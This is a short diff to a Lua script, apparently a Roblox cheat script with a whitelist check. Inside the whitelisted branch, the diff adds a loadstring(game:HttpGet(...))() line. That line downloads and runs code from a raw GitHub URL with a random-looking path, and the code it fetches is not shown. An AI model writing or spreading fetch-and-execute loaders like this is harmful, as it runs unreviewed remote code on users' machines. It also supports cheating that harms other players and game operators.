@@ -7,7 +7,7 @@ function script()
 --script if localplayer is whitelisted here
 print("Sei Whitelistato!")
 
-https://raw.githubusercontent.com/jstNAJ/nohomoontop001204312uiw-9vsoidufbw8e9sfdbvo8wbeoivwbeoufwbeoif7g3287190731tibfu/main/1i35n1oijn5oi12oy5b21in5ion1yuhoiu12bou5g12oijnkjncdoidfsno
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jstNAJ/nohomoontop001204312uiw-9vsoidufbw8e9sfdbvo8wbeoivwbeoufwbeoif7g3287190731tibfu/main/1i35n1oijn5oi12oy5b21in5ion1yuhoiu12bou5g12oijnkjncdoidfsno", true))()
 
 --script if localplayer is whitelisted here
 end
